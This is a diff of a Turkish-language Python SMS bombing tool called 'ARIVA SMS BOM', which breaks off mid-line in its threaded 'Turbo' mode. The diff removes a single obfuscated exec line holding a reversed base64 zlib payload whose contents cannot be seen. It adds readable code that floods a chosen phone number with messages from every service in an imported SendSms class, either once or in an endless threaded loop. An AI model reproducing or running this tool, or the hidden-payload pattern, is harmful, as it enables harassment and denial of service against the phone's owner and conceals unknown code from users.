@@ -1,2 +1,132 @@
-#Bu Tool @AtahanArslan İnstagram Kunlanıcısı Tarafından @SiberDunyaniz İçin Yazılmıştır Yasadışı Faliyetlerde Kunlanmak Yasaktır Ve Sorumluluk Bize Ait Değildir!!!
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+from colorama import Fore, Style
+from time import sleep
+from os import system
+from sms import SendSms
+import threading
+import pyfiglet
+import webbrowser
+
+# Kullanıcı giriş bilgileri
+KULLANICI_ADI = "ariva"
+SIFRE = "1234"
+
+def giris_ekrani():
+    system("cls||clear")
+    print(Fore.LIGHTCYAN_EX + pyfiglet.figlet_format("ARIVA SMS BOM", font="slant"))  # Font değiştirildi
+    print(Fore.LIGHTYELLOW_EX + "\n🚀 Bu Tool SiberDünyanız'a Aittir! 🚀")
+    print(Fore.LIGHTBLUE_EX + "🔗 Telegram Kanalımıza Katıl: t.me/siberdunyanizz")
+    
+    # Telegram yönlendirmesi
+    webbrowser.open("https://t.me/siberdunyanizz")
+
+    while True:
+        kullanici = input(Fore.LIGHTGREEN_EX + "👤 Kullanıcı Adı: ")
+        sifre = input(Fore.LIGHTGREEN_EX + "🔑 Şifre: ")
+        if kullanici == KULLANICI_ADI and sifre == SIFRE:
+            print(Fore.LIGHTBLUE_EX + "✅ Giriş başarılı! Hoşgeldiniz! 🎉")
+            sleep(2)
+            break
+        else:
+            print(Fore.LIGHTRED_EX + "❌ Hatalı giriş! Tekrar deneyin. 🔁")
+            sleep(2)
+            system("cls||clear")
+
+giris_ekrani()
+
+servisler_sms = []
+for attribute in dir(SendSms):
+    attribute_value = getattr(SendSms, attribute)
+    if callable(attribute_value) and not attribute.startswith('__'):
+        servisler_sms.append(attribute)
+
+while True:
+    system("cls||clear")
+    print(Fore.LIGHTCYAN_EX + f"📲 Kullanılabilir SMS Servisleri: {len(servisler_sms)}")
+    print(Fore.LIGHTMAGENTA_EX + "\n1️⃣ - Normal SMS Gönder\n2️⃣ - Turbo SMS Gönder ⚡\n3️⃣ - Çıkış 🚪")
+    secim = input(Fore.LIGHTYELLOW_EX + "👉 Seçim: ")
+
+    if secim == "1":
+        system("cls||clear")
+        print(Fore.LIGHTYELLOW_EX + "📞 Telefon numarasını girin (Başında '+90' olmadan): ")
+        tel_no = input()
+        if len(tel_no) != 10 or not tel_no.isdigit():
+            print(Fore.LIGHTRED_EX + "❌ Hatalı numara! Tekrar deneyin.")
+            sleep(2)
+            continue
+
+        print(Fore.LIGHTYELLOW_EX + "📧 Mail adresi (Bilmiyorsanız Enter'a basın): ")
+        mail = input()
+        if mail and ("@" not in mail or ".com" not in mail):
+            print(Fore.LIGHTRED_EX + "❌ Hatalı mail adresi! Tekrar deneyin.")
+            sleep(2)
+            continue
+
+        sms = SendSms(tel_no, mail)
+        system("cls||clear")
+        print(Fore.LIGHTGREEN_EX + "📤 SMS gönderiliyor...")
+
+        # Tüm SMS servislerini deniyoruz
+        basari = False
+        for fonksiyon in servisler_sms:
+            sonuc = getattr(sms, fonksiyon)()
+            if sonuc:
+                basari = True
+                print(Fore.LIGHTGREEN_EX + f"✅ {fonksiyon} ile SMS başarıyla gönderildi!")
+            else:
+                print(Fore.LIGHTRED_EX + f"❌ {fonksiyon} ile SMS gönderilemedi.")
+
+        if basari:
+            print(Fore.LIGHTGREEN_EX + "🎉 Tüm işlemler tamamlandı, SMS başarıyla gönderildi!")
+        else:
+            print(Fore.LIGHTRED_EX + "❌ Hiçbir servisle SMS gönderilemedi.")
+
+        sleep(3)
+
+    elif secim == "2":
+        system("cls||clear")
+        print(Fore.LIGHTGREEN_EX + "⚡ Turbo SMS gönderme aktif! ⚡")
+        tel_no = input(Fore.LIGHTYELLOW_EX + "📞 Telefon numarasını girin (Başında '+90' olmadan): ")
+        if len(tel_no) != 10 or not tel_no.isdigit():
+            print(Fore.LIGHTRED_EX + "❌ Hatalı numara! Tekrar deneyin.")
+            sleep(2)
+            continue
+
+        print(Fore.LIGHTYELLOW_EX + "📧 Mail adresi (Bilmiyorsanız Enter'a basın): ")
+        mail = input()
+        if mail and ("@" not in mail or ".com" not in mail):
+            print(Fore.LIGHTRED_EX + "❌ Hatalı mail adresi! Tekrar deneyin.")
+            sleep(2)
+            continue
+
+        send_sms = SendSms(tel_no, mail)
+        dur = threading.Event()
+
+        def Turbo():
+            while not dur.is_set():
+                thread_list = []
+                for fonk in servisler_sms:
+                    t = threading.Thread(target=lambda: print(
